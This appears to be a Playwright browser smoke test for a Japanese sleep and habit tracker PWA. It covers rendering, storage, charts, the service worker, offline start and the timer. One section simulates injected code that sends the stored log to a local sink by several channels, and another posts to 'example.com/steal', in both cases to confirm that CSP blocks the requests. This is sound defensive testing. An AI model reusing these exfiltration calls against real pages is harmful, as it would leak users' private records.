// 実ブラウザでしか確認できないことを見る。JSDOM は CSP を解釈せず、実描画も持たない。
// 使い方: npm run smoke
import http from "node:http";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { chromium } from "@playwright/test";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const PORT = 8899;
// Service Worker のスクリプトは JavaScript の MIME タイプで返さないとブラウザに拒否される
const TYPES = { ".html": "text/html; charset=utf-8", ".txt": "text/plain; charset=utf-8", ".js": "text/javascript; charset=utf-8" };

const results = [];
const check = (name, ok, detail) => {
  const d = detail == null ? "" : String(detail);
  results.push({ name, ok, detail: d.length > 160 ? d.slice(0, 160) + "…" : d });
};

const server = http.createServer((req, res) => {
  const path = req.url === "/" ? "/index.html" : req.url.split("?")[0];
  try {
    const body = readFileSync(join(ROOT, path));
    res.writeHead(200, { "Content-Type": TYPES[path.slice(path.lastIndexOf("."))] || "application/octet-stream" });
    res.end(body);
  } catch {
    res.writeHead(404);
    res.end("not found");
  }
});

// 記録を外部へ送ろうとする注入コードを演じ、実際に届いたリクエストだけを数える
const received = [];
const sink = http.createServer((req, res) => {
  received.push(req.method + " " + req.url);
  res.writeHead(200, { "Access-Control-Allow-Origin": "*" });
  res.end("ok");
});

await new Promise((r) => server.listen(PORT, "127.0.0.1", r));
await new Promise((r) => sink.listen(PORT + 1, "127.0.0.1", r));

const browser = await chromium.launch();
const context = await browser.newContext({ viewport: { width: 390, height: 844 } });
const page = await context.newPage();
const jsErrors = [];
page.on("pageerror", (e) => jsErrors.push(String(e.message)));
page.on("console", (m) => { if (m.type() === "error") jsErrors.push(m.text()); });

const base = `http://127.0.0.1:${PORT}/`;
await page.goto(base);

check("見出しが Aubade で描画される", (await page.textContent("h1")) === "Aubade");
check("記録タブが描画される", (await page.textContent("#view")).includes("就寝時刻"));

await page.getByRole("button", { name: "✓ した" }).first().click();
const saved = await page.evaluate(() => localStorage.getItem("flourish-log-v2"));
check("1タップで localStorage に保存される", !!saved && saved.includes("ashwagandha"));
check("「✓ 保存済み」が出る", (await page.textContent("#saveState")) === "✓ 保存済み");

// 時刻と視聴時間は分の実値を select で選ぶ(v9)。実ブラウザのネイティブピッカー経由で保存されるかを見る
await page.selectOption('select[data-f="wakeMin"]', "390");
await page.selectOption('select[data-f="bedtimeMin"]', "1410");
const wake = await page.evaluate(() => JSON.parse(localStorage.getItem("flourish-log-v2")));
const wakeDay = wake.entries[Object.keys(wake.entries)[0]];
check("起床時刻が select で分として保存される", wakeDay.wakeMin === 390, JSON.stringify(wakeDay));
check("就寝時刻も同じ経路で保存される", wakeDay.bedtimeMin === 1410, JSON.stringify(wakeDay));

// iOS は font-size 16px 未満の入力欄にフォーカスすると画面を拡大し、focus を外しても戻らない。
// JSDOM は CSS の詳細度を見ず後勝ちで解くので、実際に効く値はここでしか確かめられない
await page.getByRole("button", { name: "ひとことを書く（任意）" }).click();
const memoPx = await page.evaluate(() => parseFloat(getComputedStyle(document.getElementById("memo")).fontSize));
check("ひとこと欄が16px以上(iOSが画面を拡大しない)", memoPx >= 16, memoPx + "px");

for (const tab of ["週", "推移", "週報", "設定"]) {
  await page.getByRole("button", { name: tab, exact: true }).click();
  const len = (await page.textContent("#view")).length;
  check(`タブ「${tab}」が描画される`, len > 50, `${len}文字`);
}
await page.getByRole("button", { name: "推移", exact: true }).click();
check("推移タブにSVGが4枚以上ある", (await page.locator("svg").count()) >= 4);
check("推移タブに起床時刻チャートがある", (await page.textContent("#view")).includes("起床時刻(28日)"));
// 就寝と起床が1日ぶん揃ったので、睡眠の帯が塗られているはず
const band = await page.locator('path[fill-opacity], line[stroke-opacity]').count();
check("睡眠チャートに帯が描かれる", (await page.textContent("#view")).includes("睡眠(28日)") && band > 0, `帯の要素 ${band} 個`);

// Y軸ラベルは左余白(L=44)の内側に右寄せで描く。はみ出しても SVG が黙って左端で切るだけなので、
// 「20000歩」の先頭の2が消えても画面上は数字に見えてしまう。実測でしか気づけない
const axisOverflow = await page.evaluate(() => {
  const limit = 44 - 6;
  return [...document.querySelectorAll('#view svg text[text-anchor="end"]')]
    .map((t) => ({ s: t.textContent, w: t.getComputedTextLength() }))
    .filter((x) => x.w > limit)
    .map((x) => `${x.s}=${Math.round(x.w)}px`);
});
check("推移タブのY軸ラベルが左余白に収まる", axisOverflow.length === 0, axisOverflow.join(" / ") || "はみ出し無し");

await page.getByRole("button", { name: "90日", exact: true }).click();
check("期間を90日に切り替えられる", (await page.textContent("#view")).includes("就寝時刻(90日)"));
await page.getByRole("button", { name: "28日", exact: true }).click();

const icon = await page.evaluate(async () => {
  const im = new Image();
  im.src = document.querySelector('link[rel="icon"]').href;
  try { await im.decode(); return true; } catch { return false; }
});
check("data: のアイコンが CSP に阻まれない", icon);

// この後の持ち出し試行では CSP 違反ログが出るのが正しいので、通常操作の分だけをここで見る
check("通常操作でJSエラーが出ない", jsErrors.length === 0, jsErrors.join(" / ") || "なし");

const violations = await page.evaluate(async (sinkUrl) => {
  const v = [];
  document.addEventListener("securitypolicyviolation", (e) => v.push(e.violatedDirective));
  const secret = localStorage.getItem("flourish-log-v2") || "x";
  try { await fetch(sinkUrl + "fetch?d=" + encodeURIComponent(secret)); } catch {}
  try { const x = new XMLHttpRequest(); x.open("POST", sinkUrl + "xhr"); x.send(secret); } catch {}
  try { navigator.sendBeacon(sinkUrl + "beacon", secret); } catch {}
  try { new WebSocket(sinkUrl.replace("http", "ws")); } catch {}
  new Image().src = sinkUrl + "img?d=" + encodeURIComponent(secret);
  const f = document.createElement("form");
  f.action = sinkUrl + "form"; f.method = "POST"; document.body.appendChild(f);
  try { f.submit(); } catch {}
  await new Promise((r) => setTimeout(r, 800));
  return v;
}, `http://127.0.0.1:${PORT + 1}/`);

check("持ち出しが CSP で遮断される", violations.length >= 5, `違反 ${violations.length} 件: ${[...new Set(violations)].join(", ")}`);
check("外部サーバーに1件も届かない", received.length === 0, received.join(" / ") || "0件");
check("ページ遷移が起きていない", page.url() === base, page.url());

// connect-src を https://*.ts.net に緩めた。JSDOM は CSP を解釈しないので、
// 「許可した先には通り、それ以外は通らない」の両方をここでしか確かめられない。
// ts.net は実在しないホストなので、リクエストを横取りして到達したかどうかだけを見る
// (横取りは CSP の判定より後に働くため、ブロックされればハンドラは呼ばれない)
let tsnetReached = false;
await page.route("https://**.ts.net/**", async (route) => {
  tsnetReached = true;
  await route.fulfill({ status: 200, contentType: "application/json", body: '{"ok":true}' });
});
const tsnetResult = await page.evaluate(async () => {
  try {
    const r = await fetch("https://pc.example-tailnet.ts.net/aubade", {
      method: "POST",
      headers: { "Content-Type": "application/json", Authorization: "Bearer x" },
      body: "{}",
    });
    return "status " + r.status;
  } catch (e) { return "失敗: " + e.message; }
});
check("同期先(*.ts.net)へは CSP を通過する", tsnetReached, tsnetResult);

// 深い階層のホスト名でもワイルドカードが効くこと。ここが効かないと
// machine.tailnet.ts.net 形式の実際の宛先に届かない
check("ワイルドカードが machine.tailnet.ts.net 形式に効く", tsnetResult.startsWith("status 200"), tsnetResult);

const otherHostBlocked = await page.evaluate(async () => {
  try { await fetch("https://example.com/steal", { method: "POST", body: "x" }); return "通ってしまった"; }
  catch (e) { return "遮断: " + e.name; }
});
check("同期先以外のホストは依然として遮断される", otherHostBlocked.startsWith("遮断"), otherHostBlocked);

// Service Worker はここでしか検証できない。JSDOM は実装を持たず、CSP の worker-src も解釈しない
const swState = await page.evaluate(async () => {
  if (!("serviceWorker" in navigator)) return "APIなし";
  // 登録が CSP で弾かれると ready は永久に解決しないので、待ち時間を切る
  const reg = await Promise.race([
    navigator.serviceWorker.ready,
    new Promise((r) => setTimeout(() => r(null), 5000)),
  ]);
  return reg && reg.active ? "active" : "登録されない";
});
check("Service Worker が登録され有効になる", swState === "active", swState);

await page.reload();
check("再読み込みで Service Worker の管理下に入る", await page.evaluate(() => !!navigator.serviceWorker.controller));

// 勉強タイマー。JSDOM では「アプリを閉じている間も時間が進む」を再現できないので、
// 実ブラウザで開始 → リロード（＝閉じて開き直しに相当）→ 停止まで通す。
// 経過を待つ代わりに、保存された開始時刻を過去へずらして時間の経過を作る
await page.goto(base);
await page.getByRole("button", { name: "タイマー" }).click();
await page.getByRole("button", { name: "▶ 勉強" }).click();
const tRunning = await page.evaluate(() => localStorage.getItem("flourish-log-v2-timer"));
check("タイマーの開始時刻が別キーに残る", !!tRunning && JSON.parse(tRunning).startedAt > 0);
check("本体データにタイマーの状態を混ぜない",
  !(await page.evaluate(() => (localStorage.getItem("flourish-log-v2") || "").includes("startedAt"))));

// 25分前に開始したことにして、リロードで復帰させる
await page.evaluate(() => {
  const t = JSON.parse(localStorage.getItem("flourish-log-v2-timer"));
  t.startedAt -= 25 * 60000;
  localStorage.setItem("flourish-log-v2-timer", JSON.stringify(t));
});
await page.reload();
await page.getByRole("button", { name: "タイマー" }).click();
const elapsedShown = await page.textContent("#timerElapsed");
check("閉じて開き直しても経過が続く", elapsedShown === "25:00", elapsedShown);

// 毎秒の更新。数えているのではなく startedAt から引き直していることを実ブラウザで見る
const t0 = await page.textContent("#timerElapsed");
await page.waitForTimeout(2100);
const t1 = await page.textContent("#timerElapsed");
check("経過表示が毎秒進む", t0 !== t1, t0 + " → " + t1);

// 達成ライン th.studyMin が常にあるので、ブロブ全体ではなく entries だけを見る
const beforeStop = await page.evaluate(() => {
  const d = JSON.parse(localStorage.getItem("flourish-log-v2") || "{}");
  return Object.values(d.entries || {}).filter((e) => typeof e.studyMin === "number").length;
});
await page.getByRole("button", { name: "■ 停止して記録" }).click();
const afterStop = await page.evaluate(() => {
  const d = JSON.parse(localStorage.getItem("flourish-log-v2"));
  const days = Object.keys(d.entries).filter((k) => typeof d.entries[k].studyMin === "number");
  return days.map((k) => k + "=" + d.entries[k].studyMin).join(",");
});
check("停止すると実時間が studyMin に入る", afterStop.includes("=25"), afterStop);
check("停止でタイマーの状態が消える",
  (await page.evaluate(() => localStorage.getItem("flourish-log-v2-timer"))) === null);
check("停止前は studyMin が書かれていない", beforeStop === 0, "実測 " + beforeStop + " 件");
// 記録タブに混ぜない（朝の入力の動線を汚さない）
await page.getByRole("button", { name: "記録" }).click();
check("記録タブにタイマーが出ない", !(await page.textContent("#view")).includes("停止して記録"));

// 種別の分岐を実ブラウザでも通す。瞑想は別フィールドへ入り、勉強を増やさない
await page.goto(base);
await page.getByRole("button", { name: "タイマー" }).click();
await page.getByRole("button", { name: "▶ 瞑想" }).click();
check("走行中は開始ボタンが消える",
  (await page.getByRole("button", { name: "▶ 瞑想" }).count()) === 0);
await page.evaluate(() => {
  const t = JSON.parse(localStorage.getItem("flourish-log-v2-timer"));
  t.startedAt -= 12 * 60000;
  localStorage.setItem("flourish-log-v2-timer", JSON.stringify(t));
});
await page.reload();
await page.getByRole("button", { name: "タイマー" }).click();
await page.getByRole("button", { name: "■ 停止して記録" }).click();
const medDays = await page.evaluate(() => {
  const d = JSON.parse(localStorage.getItem("flourish-log-v2"));
  return Object.keys(d.entries).map((k) => k + ":" + d.entries[k].meditationMin + "/" + d.entries[k].studyMin).join(",");
});
// 前段の勉強25分が同じ日に残っているので、「瞑想が入って勉強が動いていない」を1つの式で見る。
// 加算先を studyMin 固定に戻すと 0/37 になって落ちる
check("瞑想は meditationMin に入り、studyMin を増やさない", medDays.includes(":12/25"), medDays);

await context.setOffline(true);
let offline = "";
try {
  await page.reload({ timeout: 8000 });
  offline = (await page.textContent("h1")) === "Aubade" ? "開けた" : "開いたが描画されない";
} catch (e) { offline = "開けない: " + e.message; }
check("オフラインでも起動する", offline === "開けた", offline);
// 記録が消えていないこと。キャッシュから起動しても localStorage は同じ容器を見る
const kept = await page.evaluate(() => localStorage.getItem("flourish-log-v2"));
check("オフライン起動でも記録が残る", !!kept && JSON.parse(kept).entries && Object.keys(JSON.parse(kept).entries).length > 0);
await context.setOffline(false);

await browser.close();
server.close();
sink.close();

const pad = Math.max(...results.map((r) => r.name.length));
for (const r of results) {
  console.log(`${r.ok ? "PASS" : "FAIL"}  ${r.name.padEnd(pad)}${r.detail ? "  — " + r.detail : ""}`);
}
const failed = results.filter((r) => !r.ok);
console.log(`\n${results.length - failed.length}/${results.length} passed`);
if (failed.length) process.exit(1);
